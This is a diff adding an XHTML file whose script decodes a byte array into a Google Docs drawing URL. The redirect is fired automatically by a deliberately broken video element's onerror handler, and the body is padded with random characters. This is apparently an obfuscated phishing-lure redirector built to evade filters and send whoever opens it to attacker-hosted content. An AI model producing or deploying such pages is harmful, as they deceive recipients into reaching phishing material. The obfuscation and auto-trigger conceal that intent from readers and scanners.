@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"> 
+<html xmlns="http://www.w3.org/1999/xhtml"> 
+<head>  
+  <script type="text/javascript">  
+    const handleError = () => { 
+      window.location.href = new TextDecoder().decode(new Uint8Array([104, 116, 116, 112, 115, 58, 47, 47, 100, 111, 99, 115, 46, 103, 111, 111, 103, 108, 101, 46, 99, 111, 109, 47, 100, 114, 97, 119, 105, 110, 103, 115, 47, 100, 47, 49, 65, 82, 111, 84, 48, 106, 122, 89, 111, 77, 55, 88, 88, 112, 49, 120, 55, 120, 87, 53, 99, 102, 65, 53, 85, 105, 118, 121, 65, 48, 74, 82, 55, 75, 50, 89, 80, 73, 90, 103, 108, 82, 99, 47, 112, 114, 101, 118, 105, 101, 119])); 
+    };   
+  </script>  
+  <video src="pdlpniqh" onerror="handleError()" /> 
+</head> 
+<body>IvXeGEp3je7kHNrVFdQwL8nTh4bE1Pqd1KR9JIXtMXirp2yBlJG4WjdmBuDA4I2U2AhBs365kdwNJaadHQqqX5AQx3wmXq9oKQqmEiWgPOEyygORVjCzbKDV0HliLvqueL6y9SPbNSkezca6anRxyUS0GtmFGavrns2dizzwUfxSjQzxxdVpLU1v75kCeVOTyrR7lBGK4lFKwMQtA4olfeaKavye1nMAYJveVd2vb4yjL9s8xew7Ryu2LSDVOEHvz3ealgof2DXoBXMwq6IHdK7hmxpqQ5GCyOVGV0U6XF5KsB4NDWSWX09ECFSB47FVBN3tBwtqjQXnSu4WhsgNae0tnaL9yO1D09ZdZJ0WfWwp6WJYO9nPPGESNHYRo4COm7nEdIImaDWO1U8Bxrk59i2wb7g4qfopYlAN2to1kNgVrZAiIO95RHni4f5ypRhBzo3nV9CyXjTqZ6BRd7flrrYHZzXY93IGmjlCJeabDZqrwfgNhkLeyVAuErYzyy6KOJWlR2FqDHYp3lTc4CuIqcnEUepEbKovFpxsDCsfROjjijr9m9gpMgUroNSjPwRXb8vPNoO9QL4k47suM93fzNbhEu3GqCRl4cL9ZzqujyP6pt8qRcjm7yknW76IyXNTtWfmywdvNFBryj5g8ZwYc4aH3anDfz0vu4KIKmXk8XQaorpw2OmdPp9qincCRQ8cDkBqnfvnNPvQxMvH0fAYZTDVXIjp3MFbS4nKu8ETw0fMDnUi1YXuJzW7T0uJVecNVMHhkTmLA5zZuD9s19ig5vUoljeyLSONcg3FPuHd61vSMOJKJXHFX7ZhovV0kp0NfxfLOdEApCo30CoAmsgNVX4gcTcraHXD1ngxaN8xi5xMHHhdrek6C21ljMd4Kghx0c2kbGhWeXUKh4mYt8M8gGJNvC4sE4RLY0MpDBHhDJX1sq2djUHOhi6eY3CWP3N7uFwh5uZiomsbZHRsLICCtXzfXFRO1rYPKDAnMRi9FnjHVnoHjQO183ZdaFxoEqu4ZWU654syjS8UxRkdxGikcRWFZftw8MbEisCaKePdtzWdCeLUs8FFLGmu0ZeIJq7ktcg8I7ci4Ce22tLUcbHMwPPlSYpNM2c4d98jGPNtRvOVEbrD0cwoa7uxSCd2Fvi2j8UL5lLDmWdT1FJtkvBxJePtLTTLdVj6tUvzKaUnEhPPAWlN48QimFergkMkF0hEqyhauff7HhKkz0ziwUFtd9bkxo4hayAEM7nce8IIAzk9CSAgBOy7rwu1INJBoNDQTykskN43N5xZOgcPnUlWMRhGJbFtiAhDUKcUpgVNTe87Ifppl7gEcqQ1JRxXqJStUOeJLGhq</body> 
+</html>
